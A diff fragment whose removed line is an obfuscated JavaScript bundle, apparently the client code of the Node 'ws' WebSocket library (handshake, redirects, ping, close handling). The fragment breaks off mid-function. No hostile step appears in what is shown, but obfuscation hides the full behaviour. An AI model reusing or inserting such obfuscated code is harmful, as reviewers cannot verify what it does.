@@ -1,1 +1,1778 @@
-function a0_0x208b(_0x2d432d,_0x32b73a){_0x2d432d=_0x2d432d-0x6e;const _0x3d5ddd=a0_0x3d5d();let _0x208b49=_0x3d5ddd[_0x2d432d];return _0x208b49;}(function(_0x3a3c54,_0x1353d8){const _0x110fd8=a0_0x208b,_0x434ee0=_0x3a3c54();while(!![]){try{const _0x38e5a3=-parseInt(_0x110fd8(0x15e))/0x1*(-parseInt(_0x110fd8(0x1c8))/0x2)+parseInt(_0x110fd8(0xc2))/0x3+-parseInt(_0x110fd8(0x1fb))/0x4+parseInt(_0x110fd8(0x232))/0x5+-parseInt(_0x110fd8(0x21d))/0x6*(parseInt(_0x110fd8(0xa3))/0x7)+parseInt(_0x110fd8(0xbb))/0x8*(-parseInt(_0x110fd8(0x207))/0x9)+parseInt(_0x110fd8(0xbe))/0xa*(parseInt(_0x110fd8(0x139))/0xb);if(_0x38e5a3===_0x1353d8)break;else _0x434ee0['push'](_0x434ee0['shift']());}catch(_0x4cda74){_0x434ee0['push'](_0x434ee0['shift']());}}}(a0_0x3d5d,0x9cdf7),((()=>{const _0xb499c2=a0_0x208b;var _0x63069a={0x10(_0x2dfffe){'use strict';const _0x409dd9=a0_0x208b;_0x2dfffe[_0x409dd9(0x1f0)]=require(_0x409dd9(0x23d));},0x3c(_0x1a5a41,_0x464d1d,_0x16320b){'use strict';const _0x4c8c3b=a0_0x208b;const _0x53dc86=_0x16320b(0x1b2),_0x26a164=_0x16320b(0x2b4),_0x54faba=_0x16320b(0x263),_0x2d5b06=_0x16320b(0x116),_0x42d296=_0x16320b(0x2f4),{randomBytes:_0x44be1c,createHash:_0x4f8fb5}=_0x16320b(0x3d6),{Duplex:_0x52cd8e,Readable:_0x5f943e}=_0x16320b(0xcb),{URL:_0x23d451}=_0x16320b(0x10),_0x216bd3=_0x16320b(0x3cb),_0x2ef839=_0x16320b(0x11e),_0x177727=_0x16320b(0x392),{isBlob:_0x51758e}=_0x16320b(0x370),{BINARY_TYPES:_0xc1021a,EMPTY_BUFFER:_0x473b45,GUID:_0x54683a,kForOnEventAttribute:_0x1b0a17,kListener:_0x5272ce,kStatusCode:_0x34a489,kWebSocket:_0x42aeef,NOOP:_0x278a2f}=_0x16320b(0x266),{EventTarget:{addEventListener:_0xb97fd0,removeEventListener:_0x33b30b}}=_0x16320b(0x255),{format:_0x181cea,parse:_0x41e3ed}=_0x16320b(0x39e),{toBuffer:_0xb3c72}=_0x16320b(0x152),_0x4269f8=Symbol(_0x4c8c3b(0x18e)),_0x3fa4cc=[0x8,0xd],_0x32abe9=[_0x4c8c3b(0x11f),_0x4c8c3b(0x11e),_0x4c8c3b(0x196),_0x4c8c3b(0xf6)],_0xdb0912=/^[!#$%&'*+\-.0-9A-Z^_`|a-z~]+$/;class _0x215055 extends _0x53dc86{constructor(_0x454f65,_0x54608e,_0x5f5cbe){const _0x1dfa0c=_0x4c8c3b;super(),this[_0x1dfa0c(0x145)]=_0xc1021a[0x0],this['_closeCode']=0x3ee,this[_0x1dfa0c(0x194)]=!0x1,this['_closeFrameSent']=!0x1,this[_0x1dfa0c(0xe5)]=_0x473b45,this['_closeTimer']=null,this[_0x1dfa0c(0xed)]=!0x1,this[_0x1dfa0c(0x10e)]={},this[_0x1dfa0c(0x22d)]=!0x1,this[_0x1dfa0c(0x1d2)]='',this[_0x1dfa0c(0x111)]=_0x215055['CONNECTING'],this[_0x1dfa0c(0xad)]=null,this[_0x1dfa0c(0x125)]=null,this['_socket']=null,null!==_0x454f65?(this[_0x1dfa0c(0x1c6)]=0x0,this[_0x1dfa0c(0x16d)]=!0x1,this[_0x1dfa0c(0xb6)]=0x0,void 0x0===_0x54608e?_0x54608e=[]:Array[_0x1dfa0c(0x172)](_0x54608e)||('object'==typeof _0x54608e&&null!==_0x54608e?(_0x5f5cbe=_0x54608e,_0x54608e=[]):_0x54608e=[_0x54608e]),_0x5913d5(this,_0x454f65,_0x54608e,_0x5f5cbe)):(this[_0x1dfa0c(0x248)]=_0x5f5cbe[_0x1dfa0c(0x20e)],this['_isServer']=!0x0);}get[_0x4c8c3b(0x19d)](){const _0x213420=_0x4c8c3b;return this[_0x213420(0x145)];}set[_0x4c8c3b(0x19d)](_0x2e05ef){const _0x33d5bf=_0x4c8c3b;_0xc1021a[_0x33d5bf(0xc6)](_0x2e05ef)&&(this[_0x33d5bf(0x145)]=_0x2e05ef,this[_0x33d5bf(0xad)]&&(this[_0x33d5bf(0xad)][_0x33d5bf(0x145)]=_0x2e05ef));}get['bufferedAmount'](){const _0x47aa8d=_0x4c8c3b;return this[_0x47aa8d(0xe9)]?this['_socket']['_writableState']['length']+this[_0x47aa8d(0x125)][_0x47aa8d(0x22c)]:this['_bufferedAmount'];}get[_0x4c8c3b(0x9d)](){const _0x4a546b=_0x4c8c3b;return Object[_0x4a546b(0xc9)](this[_0x4a546b(0x10e)])[_0x4a546b(0x219)]();}get[_0x4c8c3b(0xd7)](){const _0x10bc02=_0x4c8c3b;return this[_0x10bc02(0x22d)];}get[_0x4c8c3b(0x216)](){return null;}get[_0x4c8c3b(0x1c3)](){return null;}get[_0x4c8c3b(0x7d)](){return null;}get[_0x4c8c3b(0x119)](){return null;}get[_0x4c8c3b(0x112)](){const _0x518d53=_0x4c8c3b;return this[_0x518d53(0x1d2)];}get['readyState'](){const _0x12a176=_0x4c8c3b;return this[_0x12a176(0x111)];}get['url'](){const _0x33c5b7=_0x4c8c3b;return this[_0x33c5b7(0x14b)];}['setSocket'](_0x1e191c,_0x50c8a2,_0xc0ae2e){const _0x342beb=_0x4c8c3b,_0x3bb1d8=new _0x2ef839({'allowSynchronousEvents':_0xc0ae2e['allowSynchronousEvents'],'binaryType':this['binaryType'],'extensions':this[_0x342beb(0x10e)],'isServer':this['_isServer'],'maxPayload':_0xc0ae2e[_0x342beb(0x190)],'skipUTF8Validation':_0xc0ae2e[_0x342beb(0x242)]}),_0x212175=new _0x177727(_0x1e191c,this[_0x342beb(0x10e)],_0xc0ae2e['generateMask']);this[_0x342beb(0xad)]=_0x3bb1d8,this[_0x342beb(0x125)]=_0x212175,this[_0x342beb(0xe9)]=_0x1e191c,_0x3bb1d8[_0x42aeef]=this,_0x212175[_0x42aeef]=this,_0x1e191c[_0x42aeef]=this,_0x3bb1d8['on'](_0x342beb(0x6f),_0x37a898),_0x3bb1d8['on'](_0x342beb(0x244),_0x3a10a2),_0x3bb1d8['on'](_0x342beb(0x1b9),_0x9b840f),_0x3bb1d8['on'](_0x342beb(0x1df),_0x1dc1f9),_0x3bb1d8['on'](_0x342beb(0x186),_0x434e03),_0x3bb1d8['on'](_0x342beb(0xc1),_0x360e9b),_0x212175[_0x342beb(0x1c3)]=_0xba257a,_0x1e191c['setTimeout']&&_0x1e191c[_0x342beb(0x1f9)](0x0),_0x1e191c['setNoDelay']&&_0x1e191c['setNoDelay'](),_0x50c8a2[_0x342beb(0x1d7)]>0x0&&_0x1e191c[_0x342beb(0x91)](_0x50c8a2),_0x1e191c['on'](_0x342beb(0x1d3),_0x5540e4),_0x1e191c['on'](_0x342beb(0x19a),_0x2aa04e),_0x1e191c['on'](_0x342beb(0x1ac),_0xc7a36a),_0x1e191c['on'](_0x342beb(0x1b9),_0x2a6bab),this[_0x342beb(0x111)]=_0x215055[_0x342beb(0x11e)],this['emit']('open');}[_0x4c8c3b(0x170)](){const _0x97bc5d=_0x4c8c3b;if(!this[_0x97bc5d(0xe9)])return this['_readyState']=_0x215055[_0x97bc5d(0xf6)],void this[_0x97bc5d(0x200)](_0x97bc5d(0x1d3),this[_0x97bc5d(0x1cd)],this[_0x97bc5d(0xe5)]);this[_0x97bc5d(0x10e)][_0x216bd3['extensionName']]&&this[_0x97bc5d(0x10e)][_0x216bd3[_0x97bc5d(0x1e6)]][_0x97bc5d(0x109)](),this[_0x97bc5d(0xad)][_0x97bc5d(0xff)](),this[_0x97bc5d(0x111)]=_0x215055['CLOSED'],this[_0x97bc5d(0x200)]('close',this[_0x97bc5d(0x1cd)],this[_0x97bc5d(0xe5)]);}[_0x4c8c3b(0x1d3)](_0x243a74,_0xd3e4c){const _0x3c862b=_0x4c8c3b;if(this[_0x3c862b(0x121)]!==_0x215055['CLOSED']){if(this[_0x3c862b(0x121)]===_0x215055[_0x3c862b(0x11f)]){const _0x958b77=_0x3c862b(0x20c);return void _0x4c3d66(this,this[_0x3c862b(0x159)],_0x958b77);}this['readyState']!==_0x215055['CLOSING']?(this['_readyState']=_0x215055['CLOSING'],this['_sender'][_0x3c862b(0x1d3)](_0x243a74,_0xd3e4c,!this[_0x3c862b(0x16d)],_0x23f6da=>{const _0x382d62=_0x3c862b;_0x23f6da||(this[_0x382d62(0x8e)]=!0x0,(this[_0x382d62(0x194)]||this['_receiver'][_0x382d62(0x223)][_0x382d62(0x19b)])&&this['_socket'][_0x382d62(0x1ac)]());}),_0x470f55(this)):this[_0x3c862b(0x8e)]&&(this[_0x3c862b(0x194)]||this[_0x3c862b(0xad)][_0x3c862b(0x223)][_0x3c862b(0x19b)])&&this[_0x3c862b(0xe9)][_0x3c862b(0x1ac)]();}}[_0x4c8c3b(0x110)](){const _0x49073c=_0x4c8c3b;this[_0x49073c(0x121)]!==_0x215055[_0x49073c(0x11f)]&&this[_0x49073c(0x121)]!==_0x215055[_0x49073c(0xf6)]&&(this[_0x49073c(0x22d)]=!0x0,this['_socket'][_0x49073c(0x110)]());}[_0x4c8c3b(0x186)](_0x5b7ac5,_0x305459,_0xb48ad){const _0x17a065=_0x4c8c3b;if(this['readyState']===_0x215055[_0x17a065(0x11f)])throw new Error(_0x17a065(0x9f));_0x17a065(0xd4)==typeof _0x5b7ac5?(_0xb48ad=_0x5b7ac5,_0x5b7ac5=_0x305459=void 0x0):_0x17a065(0xd4)==typeof _0x305459&&(_0xb48ad=_0x305459,_0x305459=void 0x0),'number'==typeof _0x5b7ac5&&(_0x5b7ac5=_0x5b7ac5[_0x17a065(0xfc)]()),this[_0x17a065(0x121)]===_0x215055[_0x17a065(0x11e)]?(void 0x0===_0x305459&&(_0x305459=!this[_0x17a065(0x16d)]),this[_0x17a065(0x125)]['ping'](_0x5b7ac5||_0x473b45,_0x305459,_0xb48ad)):_0x177b12(this,_0x5b7ac5,_0xb48ad);}[_0x4c8c3b(0xc1)](_0x460964,_0x391a72,_0x2445b9){const _0x5e35ae=_0x4c8c3b;if(this[_0x5e35ae(0x121)]===_0x215055[_0x5e35ae(0x11f)])throw new Error(_0x5e35ae(0x9f));_0x5e35ae(0xd4)==typeof _0x460964?(_0x2445b9=_0x460964,_0x460964=_0x391a72=void 0x0):_0x5e35ae(0xd4)==typeof _0x391a72&&(_0x2445b9=_0x391a72,_0x391a72=void 0x0),_0x5e35ae(0x115)==typeof _0x460964&&(_0x460964=_0x460964[_0x5e35ae(0xfc)]()),this[_0x5e35ae(0x121)]===_0x215055[_0x5e35ae(0x11e)]?(void 0x0===_0x391a72&&(_0x391a72=!this[_0x5e35ae(0x16d)]),this[_0x5e35ae(0x125)]['pong'](_0x460964||_0x473b45,_0x391a72,_0x2445b9)):_0x177b12(this,_0x460964,_0x2445b9);}['resume'](){const _0x52e2b1=_0x4c8c3b;this[_0x52e2b1(0x121)]!==_0x215055['CONNECTING']&&this[_0x52e2b1(0x121)]!==_0x215055[_0x52e2b1(0xf6)]&&(this[_0x52e2b1(0x22d)]=!0x1,this['_receiver']['_writableState']['needDrain']||this[_0x52e2b1(0xe9)][_0x52e2b1(0x150)]());}['send'](_0x34362a,_0x4a6a3d,_0x3a77f1){const _0x31f5c2=_0x4c8c3b;if(this[_0x31f5c2(0x121)]===_0x215055[_0x31f5c2(0x11f)])throw new Error(_0x31f5c2(0x9f));if(_0x31f5c2(0xd4)==typeof _0x4a6a3d&&(_0x3a77f1=_0x4a6a3d,_0x4a6a3d={}),_0x31f5c2(0x115)==typeof _0x34362a&&(_0x34362a=_0x34362a[_0x31f5c2(0xfc)]()),this[_0x31f5c2(0x121)]!==_0x215055[_0x31f5c2(0x11e)])return void _0x177b12(this,_0x34362a,_0x3a77f1);const _0x1ba6de={'binary':_0x31f5c2(0x264)!=typeof _0x34362a,'mask':!this[_0x31f5c2(0x16d)],'compress':!0x0,'fin':!0x0,..._0x4a6a3d};this[_0x31f5c2(0x10e)][_0x216bd3[_0x31f5c2(0x1e6)]]||(_0x1ba6de['compress']=!0x1),this[_0x31f5c2(0x125)][_0x31f5c2(0x77)](_0x34362a||_0x473b45,_0x1ba6de,_0x3a77f1);}[_0x4c8c3b(0x1a5)](){const _0x32c763=_0x4c8c3b;if(this['readyState']!==_0x215055[_0x32c763(0xf6)]){if(this['readyState']===_0x215055[_0x32c763(0x11f)]){const _0x3bb2e4=_0x32c763(0x20c);return void _0x4c3d66(this,this[_0x32c763(0x159)],_0x3bb2e4);}this[_0x32c763(0xe9)]&&(this[_0x32c763(0x111)]=_0x215055[_0x32c763(0x196)],this[_0x32c763(0xe9)][_0x32c763(0x220)]());}}}function _0x5913d5(_0x9a27d4,_0xb7372e,_0x531e7f,_0x1af095){const _0x242101=_0x4c8c3b,_0x99dd55={'allowSynchronousEvents':!0x0,'autoPong':!0x0,'protocolVersion':_0x3fa4cc[0x1],'maxPayload':0x6400000,'skipUTF8Validation':!0x1,'perMessageDeflate':!0x0,'followRedirects':!0x1,'maxRedirects':0xa,..._0x1af095,'socketPath':void 0x0,'hostname':void 0x0,'protocol':void 0x0,'timeout':void 0x0,'method':_0x242101(0xf9),'host':void 0x0,'path':void 0x0,'port':void 0x0};if(_0x9a27d4[_0x242101(0x248)]=_0x99dd55[_0x242101(0x20e)],!_0x3fa4cc[_0x242101(0xc6)](_0x99dd55[_0x242101(0xc3)]))throw new RangeError('Unsupported\x20protocol\x20version:\x20'+_0x99dd55[_0x242101(0xc3)]+_0x242101(0xb2)+_0x3fa4cc[_0x242101(0x219)](',\x20')+')');let _0xd52906;if(_0xb7372e instanceof _0x23d451)_0xd52906=_0xb7372e;else try{_0xd52906=new _0x23d451(_0xb7372e);}catch(_0x429389){throw new SyntaxError(_0x242101(0x12d)+_0xb7372e);}_0x242101(0x178)===_0xd52906[_0x242101(0x112)]?_0xd52906[_0x242101(0x112)]=_0x242101(0x1dc):_0x242101(0xa7)===_0xd52906['protocol']&&(_0xd52906[_0x242101(0x112)]='wss:'),_0x9a27d4[_0x242101(0x14b)]=_0xd52906['href'];const _0x101cea=_0x242101(0xac)===_0xd52906['protocol'],_0x17431e=_0x242101(0x1e5)===_0xd52906[_0x242101(0x112)];let _0x37f754;if(_0x242101(0x1dc)===_0xd52906[_0x242101(0x112)]||_0x101cea||_0x17431e?_0x17431e&&!_0xd52906[_0x242101(0x23c)]?_0x37f754=_0x242101(0x1e7):_0xd52906[_0x242101(0x193)]&&(_0x37f754='The\x20URL\x20contains\x20a\x20fragment\x20identifier'):_0x37f754=_0x242101(0x174),_0x37f754){const _0x2f7c70=new SyntaxError(_0x37f754);if(0x0===_0x9a27d4[_0x242101(0xb6)])throw _0x2f7c70;return void _0x5d095c(_0x9a27d4,_0x2f7c70);}const _0x139936=_0x101cea?0x1bb:0x50,_0x4ef68f=_0x44be1c(0x10)[_0x242101(0xfc)](_0x242101(0x14d)),_0x551adf=_0x101cea?_0x26a164[_0x242101(0x21c)]:_0x54faba[_0x242101(0x21c)],_0xffb936=new Set();let _0x1dfc17,_0x1c10e9;if(_0x99dd55[_0x242101(0x1fc)]=_0x99dd55[_0x242101(0x1fc)]||(_0x101cea?_0x3afac9:_0x233608),_0x99dd55['defaultPort']=_0x99dd55[_0x242101(0x1fe)]||_0x139936,_0x99dd55['port']=_0xd52906['port']||_0x139936,_0x99dd55[_0x242101(0x228)]=_0xd52906[_0x242101(0x1f2)][_0x242101(0x15b)]('[')?_0xd52906[_0x242101(0x1f2)][_0x242101(0x233)](0x1,-0x1):_0xd52906[_0x242101(0x1f2)],_0x99dd55[_0x242101(0x9a)]={..._0x99dd55[_0x242101(0x9a)],'Sec-WebSocket-Version':_0x99dd55[_0x242101(0xc3)],'Sec-WebSocket-Key':_0x4ef68f,'Connection':_0x242101(0x221),'Upgrade':'websocket'},_0x99dd55[_0x242101(0xdd)]=_0xd52906[_0x242101(0x23c)]+_0xd52906['search'],_0x99dd55[_0x242101(0x256)]=_0x99dd55[_0x242101(0x21e)],_0x99dd55['perMessageDeflate']&&(_0x1dfc17=new _0x216bd3(!0x0!==_0x99dd55['perMessageDeflate']?_0x99dd55[_0x242101(0x191)]:{},!0x1,_0x99dd55[_0x242101(0x190)]),_0x99dd55[_0x242101(0x9a)][_0x242101(0x212)]=_0x181cea({[_0x216bd3[_0x242101(0x1e6)]]:_0x1dfc17[_0x242101(0x25c)]()})),_0x531e7f[_0x242101(0x1d7)]){for(const _0x35c158 of _0x531e7f){if('string'!=typeof _0x35c158||!_0xdb0912[_0x242101(0xe8)](_0x35c158)||_0xffb936[_0x242101(0x183)](_0x35c158))throw new SyntaxError(_0x242101(0x78));_0xffb936[_0x242101(0x181)](_0x35c158);}_0x99dd55[_0x242101(0x9a)][_0x242101(0x17d)]=_0x531e7f[_0x242101(0x219)](',');}if(_0x99dd55[_0x242101(0x1ad)]&&(_0x99dd55[_0x242101(0xc3)]<0xd?_0x99dd55[_0x242101(0x9a)][_0x242101(0xf5)]=_0x99dd55[_0x242101(0x1ad)]:_0x99dd55[_0x242101(0x9a)]['Origin']=_0x99dd55[_0x242101(0x1ad)]),(_0xd52906[_0x242101(0x250)]||_0xd52906[_0x242101(0x229)])&&(_0x99dd55[_0x242101(0x10f)]=_0xd52906['username']+':'+_0xd52906[_0x242101(0x229)]),_0x17431e){const _0x3c0885=_0x99dd55['path'][_0x242101(0xde)](':');_0x99dd55['socketPath']=_0x3c0885[0x0],_0x99dd55[_0x242101(0xdd)]=_0x3c0885[0x1];}if(_0x99dd55[_0x242101(0x239)]){if(0x0===_0x9a27d4[_0x242101(0xb6)]){_0x9a27d4[_0x242101(0x1b2)]=_0x17431e,_0x9a27d4[_0x242101(0x1b0)]=_0x101cea,_0x9a27d4[_0x242101(0x1b7)]=_0x17431e?_0x99dd55['socketPath']:_0xd52906[_0x242101(0x228)];const _0x1637b8=_0x1af095&&_0x1af095['headers'];if(_0x1af095={..._0x1af095,'headers':{}},_0x1637b8){for(const [_0x1cee05,_0x20f33a]of Object[_0x242101(0xba)](_0x1637b8))_0x1af095[_0x242101(0x9a)][_0x1cee05[_0x242101(0xec)]()]=_0x20f33a;}}else{if(0x0===_0x9a27d4['listenerCount'](_0x242101(0x18b))){const _0x350cd0=_0x17431e?!!_0x9a27d4[_0x242101(0x1b2)]&&_0x99dd55[_0x242101(0x17b)]===_0x9a27d4['_originalHostOrSocketPath']:!_0x9a27d4['_originalIpc']&&_0xd52906[_0x242101(0x228)]===_0x9a27d4['_originalHostOrSocketPath'];(!_0x350cd0||_0x9a27d4['_originalSecure']&&!_0x101cea)&&(delete _0x99dd55[_0x242101(0x9a)][_0x242101(0x226)],delete _0x99dd55[_0x242101(0x9a)][_0x242101(0x153)],_0x350cd0||delete _0x99dd55[_0x242101(0x9a)][_0x242101(0x228)],_0x99dd55['auth']=void 0x0);}}_0x99dd55[_0x242101(0x10f)]&&!_0x1af095[_0x242101(0x9a)][_0x242101(0x226)]&&(_0x1af095['headers']['authorization']='Basic\x20'+Buffer[_0x242101(0x1f7)](_0x99dd55[_0x242101(0x10f)])[_0x242101(0xfc)](_0x242101(0x14d))),_0x1c10e9=_0x9a27d4['_req']=_0x551adf(_0x99dd55),_0x9a27d4[_0x242101(0xb6)]&&_0x9a27d4[_0x242101(0x200)](_0x242101(0x18b),_0x9a27d4[_0x242101(0x23d)],_0x1c10e9);}else _0x1c10e9=_0x9a27d4[_0x242101(0x159)]=_0x551adf(_0x99dd55);_0x99dd55[_0x242101(0x256)]&&_0x1c10e9['on'](_0x242101(0x256),()=>{const _0x21d955=_0x242101;_0x4c3d66(_0x9a27d4,_0x1c10e9,_0x21d955(0xa8));}),_0x1c10e9['on'](_0x242101(0x1b9),_0x7ae8be=>{null===_0x1c10e9||_0x1c10e9[_0x4269f8]||(_0x1c10e9=_0x9a27d4['_req']=null,_0x5d095c(_0x9a27d4,_0x7ae8be));}),_0x1c10e9['on'](_0x242101(0x1ff),_0x5b57f2=>{const _0xce853a=_0x242101,_0x2fbefc=_0x5b57f2['headers']['location'],_0x38beab=_0x5b57f2['statusCode'];if(_0x2fbefc&&_0x99dd55[_0xce853a(0x239)]&&_0x38beab>=0x12c&&_0x38beab<0x190){if(++_0x9a27d4[_0xce853a(0xb6)]>_0x99dd55['maxRedirects'])return void _0x4c3d66(_0x9a27d4,_0x1c10e9,_0xce853a(0x94));let _0x1e78db;_0x1c10e9[_0xce853a(0x12c)]();try{_0x1e78db=new _0x23d451(_0x2fbefc,_0xb7372e);}catch(_0x49c4bc){const _0x188da5=new SyntaxError('Invalid\x20URL:\x20'+_0x2fbefc);return void _0x5d095c(_0x9a27d4,_0x188da5);}_0x5913d5(_0x9a27d4,_0x1e78db,_0x531e7f,_0x1af095);}else _0x9a27d4[_0xce853a(0x200)](_0xce853a(0x1cf),_0x1c10e9,_0x5b57f2)||_0x4c3d66(_0x9a27d4,_0x1c10e9,_0xce853a(0x175)+_0x5b57f2[_0xce853a(0x252)]);}),_0x1c10e9['on'](_0x242101(0x22a),(_0x472c09,_0x34c0c8,_0x2d5400)=>{const _0x3fc0d2=_0x242101;if(_0x9a27d4['emit']('upgrade',_0x472c09),_0x9a27d4[_0x3fc0d2(0x121)]!==_0x215055[_0x3fc0d2(0x11f)])return;_0x1c10e9=_0x9a27d4[_0x3fc0d2(0x159)]=null;const _0x9a2f16=_0x472c09['headers'][_0x3fc0d2(0x22a)];if(void 0x0===_0x9a2f16||'websocket'!==_0x9a2f16['toLowerCase']())return void _0x4c3d66(_0x9a27d4,_0x34c0c8,_0x3fc0d2(0x166));const _0x5f206e=_0x4f8fb5(_0x3fc0d2(0x152))[_0x3fc0d2(0x11a)](_0x4ef68f+_0x54683a)[_0x3fc0d2(0xfb)](_0x3fc0d2(0x14d));if(_0x472c09[_0x3fc0d2(0x9a)][_0x3fc0d2(0x20b)]!==_0x5f206e)return void _0x4c3d66(_0x9a27d4,_0x34c0c8,'Invalid\x20Sec-WebSocket-Accept\x20header');const _0x32859a=_0x472c09['headers'][_0x3fc0d2(0x1fd)];let _0x12ea39;if(void 0x0!==_0x32859a?_0xffb936[_0x3fc0d2(0x222)]?_0xffb936[_0x3fc0d2(0x183)](_0x32859a)||(_0x12ea39='Server\x20sent\x20an\x20invalid\x20subprotocol'):_0x12ea39=_0x3fc0d2(0x15a):_0xffb936[_0x3fc0d2(0x222)]&&(_0x12ea39='Server\x20sent\x20no\x20subprotocol'),_0x12ea39)return void _0x4c3d66(_0x9a27d4,_0x34c0c8,_0x12ea39);_0x32859a&&(_0x9a27d4['_protocol']=_0x32859a);const _0x5482dd=_0x472c09[_0x3fc0d2(0x9a)]['sec-websocket-extensions'];if(void 0x0!==_0x5482dd){if(!_0x1dfc17)return void _0x4c3d66(_0x9a27d4,_0x34c0c8,_0x3fc0d2(0x16c));let _0x2e08cf;try{_0x2e08cf=_0x41e3ed(_0x5482dd);}catch(_0x3686ab){return void _0x4c3d66(_0x9a27d4,_0x34c0c8,_0x3fc0d2(0x8a));}const _0x45a0ab=Object[_0x3fc0d2(0xc9)](_0x2e08cf);if(0x1!==_0x45a0ab['length']||_0x45a0ab[0x0]!==_0x216bd3[_0x3fc0d2(0x1e6)])return void _0x4c3d66(_0x9a27d4,_0x34c0c8,_0x3fc0d2(0x258));try{_0x1dfc17[_0x3fc0d2(0x127)](_0x2e08cf[_0x216bd3[_0x3fc0d2(0x1e6)]]);}catch(_0x1c3d64){return void _0x4c3d66(_0x9a27d4,_0x34c0c8,'Invalid\x20Sec-WebSocket-Extensions\x20header');}_0x9a27d4[_0x3fc0d2(0x10e)][_0x216bd3[_0x3fc0d2(0x1e6)]]=_0x1dfc17;}_0x9a27d4[_0x3fc0d2(0x11b)](_0x34c0c8,_0x2d5400,{'allowSynchronousEvents':_0x99dd55[_0x3fc0d2(0x16e)],'generateMask':_0x99dd55[_0x3fc0d2(0x1aa)],'maxPayload':_0x99dd55[_0x3fc0d2(0x190)],'skipUTF8Validation':_0x99dd55['skipUTF8Validation']});}),_0x99dd55[_0x242101(0x197)]?_0x99dd55['finishRequest'](_0x1c10e9,_0x9a27d4):_0x1c10e9['end']();}function _0x5d095c(_0x980243,_0xd239a0){const _0x2c8bf3=_0x4c8c3b;_0x980243[_0x2c8bf3(0x111)]=_0x215055[_0x2c8bf3(0x196)],_0x980243[_0x2c8bf3(0xed)]=!0x0,_0x980243['emit']('error',_0xd239a0),_0x980243[_0x2c8bf3(0x170)]();}function _0x233608(_0x122fd4){const _0x3ab1dc=_0x4c8c3b;return _0x122fd4[_0x3ab1dc(0xdd)]=_0x122fd4[_0x3ab1dc(0x17b)],_0x2d5b06[_0x3ab1dc(0x133)](_0x122fd4);}function _0x3afac9(_0x5121d8){const _0x4b111b=_0x4c8c3b;return _0x5121d8[_0x4b111b(0xdd)]=void 0x0,_0x5121d8['servername']||''===_0x5121d8[_0x4b111b(0xdb)]||(_0x5121d8['servername']=_0x2d5b06[_0x4b111b(0x24c)](_0x5121d8[_0x4b111b(0x228)])?'':_0x5121d8[_0x4b111b(0x228)]),_0x42d296[_0x4b111b(0x133)](_0x5121d8);}function _0x4c3d66(_0x4950f7,_0x9deb79,_0x61557f){const _0x312b1f=_0x4c8c3b;_0x4950f7['_readyState']=_0x215055[_0x312b1f(0x196)];const _0x2e62dc=new Error(_0x61557f);Error['captureStackTrace'](_0x2e62dc,_0x4c3d66),_0x9deb79[_0x312b1f(0xd8)]?(_0x9deb79[_0x4269f8]=!0x0,_0x9deb79[_0x312b1f(0x12c)](),_0x9deb79['socket']&&!_0x9deb79[_0x312b1f(0x105)][_0x312b1f(0xa4)]&&_0x9deb79[_0x312b1f(0x105)][_0x312b1f(0x220)](),process[_0x312b1f(0x128)](_0x5d095c,_0x4950f7,_0x2e62dc)):(_0x9deb79[_0x312b1f(0x220)](_0x2e62dc),_0x9deb79[_0x312b1f(0x205)]('error',_0x4950f7[_0x312b1f(0x200)]['bind'](_0x4950f7,_0x312b1f(0x1b9))),_0x9deb79[_0x312b1f(0x205)](_0x312b1f(0x1d3),_0x4950f7[_0x312b1f(0x170)][_0x312b1f(0x204)](_0x4950f7)));}function _0x177b12(_0x273648,_0x5453a6,_0x4ef52d){const _0xb14a93=_0x4c8c3b;if(_0x5453a6){const _0x89b044=_0x51758e(_0x5453a6)?_0x5453a6[_0xb14a93(0x222)]:_0xb3c72(_0x5453a6)[_0xb14a93(0x1d7)];_0x273648[_0xb14a93(0xe9)]?_0x273648[_0xb14a93(0x125)][_0xb14a93(0x22c)]+=_0x89b044:_0x273648[_0xb14a93(0x1c6)]+=_0x89b044;}if(_0x4ef52d){const _0x35842f=new Error(_0xb14a93(0x199)+_0x273648[_0xb14a93(0x121)]+'\x20('+_0x32abe9[_0x273648[_0xb14a93(0x121)]]+')');process[_0xb14a93(0x128)](_0x4ef52d,_0x35842f);}}function _0x37a898(_0x4d8ced,_0x568648){const _0x36643b=_0x4c8c3b,_0x667d1f=this[_0x42aeef];_0x667d1f[_0x36643b(0x194)]=!0x0,_0x667d1f[_0x36643b(0xe5)]=_0x568648,_0x667d1f[_0x36643b(0x1cd)]=_0x4d8ced,void 0x0!==_0x667d1f[_0x36643b(0xe9)][_0x42aeef]&&(_0x667d1f[_0x36643b(0xe9)][_0x36643b(0xf2)]('data',_0x2aa04e),process[_0x36643b(0x128)](_0x2831d7,_0x667d1f['_socket']),0x3ed===_0x4d8ced?_0x667d1f[_0x36643b(0x1d3)]():_0x667d1f[_0x36643b(0x1d3)](_0x4d8ced,_0x568648));}function _0x3a10a2(){const _0x5b4684=_0x4c8c3b,_0x2016e4=this[_0x42aeef];_0x2016e4['isPaused']||_0x2016e4[_0x5b4684(0xe9)]['resume']();}function _0x9b840f(_0x379354){const _0x43c37a=_0x4c8c3b,_0x447b00=this[_0x42aeef];void 0x0!==_0x447b00['_socket'][_0x42aeef]&&(_0x447b00['_socket']['removeListener']('data',_0x2aa04e),process[_0x43c37a(0x128)](_0x2831d7,_0x447b00[_0x43c37a(0xe9)]),_0x447b00[_0x43c37a(0x1d3)](_0x379354[_0x34a489])),_0x447b00[_0x43c37a(0xed)]||(_0x447b00[_0x43c37a(0xed)]=!0x0,_0x447b00[_0x43c37a(0x200)](_0x43c37a(0x1b9),_0x379354));}function _0x576c8e(){this[_0x42aeef]['emitClose']();}function _0x1dc1f9(_0x1140c0,_0x1a35c1){const _0x3356b8=_0x4c8c3b;this[_0x42aeef][_0x3356b8(0x200)](_0x3356b8(0x1df),_0x1140c0,_0x1a35c1);}function _0x434e03(_0x1dbc42){const _0x49157b=_0x4c8c3b,_0x520460=this[_0x42aeef];_0x520460['_autoPong']&&_0x520460[_0x49157b(0xc1)](_0x1dbc42,!this['_isServer'],_0x278a2f),_0x520460['emit']('ping',_0x1dbc42);}function _0x360e9b(_0x4d6278){const _0x3b61c2=_0x4c8c3b;this[_0x42aeef][_0x3b61c2(0x200)](_0x3b61c2(0xc1),_0x4d6278);}function _0x2831d7(_0x564714){_0x564714['resume']();}function _0xba257a(_0x5e1cb8){const 